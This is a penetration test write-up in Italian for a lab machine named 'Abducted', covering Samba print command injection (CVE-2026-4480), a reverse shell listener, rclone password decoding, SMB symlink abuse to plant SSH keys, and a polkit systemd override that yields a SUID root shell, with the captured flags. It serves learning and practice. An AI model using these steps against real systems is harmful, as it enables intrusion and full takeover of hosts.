# Penetration Test Report

## Informazioni sulla Macchina

| Campo | Valore |
|---|---|
| **Nome** | Abducted |
| **IP Target** | 10.129.16.32 |
| **IP Attaccante** | 10.10.14.115 |
| **OS** | Linux (Ubuntu 24.04) |
| **Difficoltà** | Medium |
| **Servizi** | SSH (22), SMB/Samba (139, 445) |
| **Vettore iniziale** | CVE-2026-4480 — Samba Print Command Injection (Pre-Auth RCE) |
| **Privesc** | Polkit + systemd service unit override (gruppo operators) |
| **Data** | 11 Giugno 2026 |
| **Autore** | atimal04 |

## Flag Catturate

| USER FLAG | ROOT FLAG |
|---|---|
| `df8b70354494e9754466e95f20e41e76` | `cefeb068f891cd2f29db5054bb6879c8` |

---

## 1. Ricognizione e Scansione

La scansione Nmap ha rivelato una superficie di attacco ridotta: solo SSH sulla porta 22 e Samba sulle porte 139/445. L'enumerazione SMB con `enum4linux-ng` ha identificato un singolo utente (`scott` / Scott Mercer) e quattro share: `HP-Reception` (stampante, accessibile in guest), `projects`, `transfer` e `IPC$`.

```bash
sudo nmap -sC -sV -p- --min-rate 5000 10.129.16.32
```
```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH 9.6p1 Ubuntu
139/tcp open  netbios-ssn  Samba smbd 4
445/tcp open  netbios-ssn  Samba smbd 4
```

L'analisi di `smb.conf` ha rivelato configurazioni critiche: `printing = sysv`, `disable spoolss = no` e il `print command` con macro `%J` non sanitizzata.

---

## 2. Foothold — CVE-2026-4480 (Pre-Auth RCE)

CVE-2026-4480 è una vulnerabilità critica (CVSS 10.0) nel printing subsystem di Samba. Il `print command` è configurato con la macro `%J` che sostituisce la job description fornita dal client. Samba non sanitizza i metacaratteri shell prima di passare la stringa a `system()`, permettendo command injection.

Il vettore corretto non è il legacy RAP print path (che sanitizza i metacaratteri) ma l'interfaccia **spoolss RPC**, che passa il document name direttamente a `%J` senza modifiche. La share `HP-Reception` era accessibile come guest, rendendo l'exploit pre-authentication.

```bash
# Terminale 1 — listener
nc -lvnp 4444

# Terminale 2 — exploit tramite spoolss RPC
python3 exploit.py 10.129.16.32 10.10.14.115 4444
```
```
# Risultato
nobody@abducted:/var/spool/samba$
```

Shell ottenuta come `nobody` nel contesto del processo Samba.

---

## 3. Lateral Movement — nobody → scott

Esplorando il filesystem come `nobody`, è stato trovato il file di configurazione rclone per il backup offsite in `/opt/offsite-backup/rclone.conf`. Il file conteneva una password offuscata con l'algoritmo proprietario di rclone.

```ini
# rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

```bash
# Decodifica su Kali
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# Output: iXzvcib3SrpZ

# Password reuse su SSH
ssh scott@10.129.16.32   # password: iXzvcib3SrpZ
```
```
scott@abducted:~$ cat user.txt
df8b70354494e9754466e95f20e41e76
```

---

## 4. Lateral Movement — scott → marcus

La share `transfer` presentava due misconfigurazioni in `smb.conf`: `wide links = yes` (permette di seguire symlink fuori dalla share) e `force user = marcus` (tutti i file vengono letti/scritti con i permessi di marcus). Come `scott`, con permessi di scrittura sulla directory `/srv/transfer`, è stato possibile:

1. Creare un symlink `/srv/transfer/marcus_home` → `/home/marcus`
2. Connettersi alla share via SMB come `scott`
3. Navigare in `marcus_home` (Samba segue il symlink come `marcus`)
4. Creare la directory `.ssh` e caricare la chiave SSH pubblica come `authorized_keys`

```bash
# Su scott — crea symlink
ln -sf /home/marcus /srv/transfer/marcus_home

# Su Kali — genera coppia di chiavi
ssh-keygen -t rsa -f /tmp/marcus_key -N ''

# Da Kali — carica authorized_keys via SMB (force user = marcus)
smbclient //10.129.16.32/transfer -U scott --password='iXzvcib3SrpZ'
smb: \> cd marcus_home
smb: \marcus_home\> mkdir .ssh
smb: \marcus_home\> cd .ssh
smb: \marcus_home\.ssh\> put /tmp/marcus_key.pub authorized_keys

# SSH come marcus
ssh -i /tmp/marcus_key marcus@10.129.16.32
```

---

## 5. Privilege Escalation — marcus → root

Marcus appartiene al gruppo `operators` (GID 1000). Una regola polkit non documentata nei file standard ma attiva nel daemon permetteva ai membri del gruppo `operators` di modificare unit file systemd tramite `systemctl edit` senza autenticazione.

È stato creato un override drop-in per `smbd.service` con una direttiva `ExecStartPre` che copia bash con il bit SUID in `/tmp` al momento del riavvio del servizio. Il riavvio tramite `systemctl` (consentito da polkit) ha eseguito il comando come root.

```bash
# Crea override con ExecStartPre malevolo
mkdir -p /etc/systemd/system/smbd.service.d/
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
EOF

# Ricarica e riavvia (polkit permette a marcus senza password)
systemctl daemon-reload
systemctl restart smbd

# Esegui bash SUID come root
/tmp/rootbash -p
```
```
rootbash-5.2# whoami
root
rootbash-5.2# cat /root/root.txt
cefeb068f891cd2f29db5054bb6879c8
```

---

## 6. Catena di Attacco

| Fase | Tecnica | Da | A |
|---|---|---|---|
| Foothold | CVE-2026-4480 — spoolss RPC injection | N/A (guest) | `nobody` |
| Creds | `rclone reveal` su password offuscata | `nobody` | — |
| User Password reuse | Riutilizzo credenziali via SSH | — | `scott` |
| Symlink | `wide links` + `force user` su SMB | `scott` | — |
| SSH key | Scrittura `authorized_keys` via SMB | — | `marcus` |
| Root | Polkit systemd unit override | `marcus` | `root` |
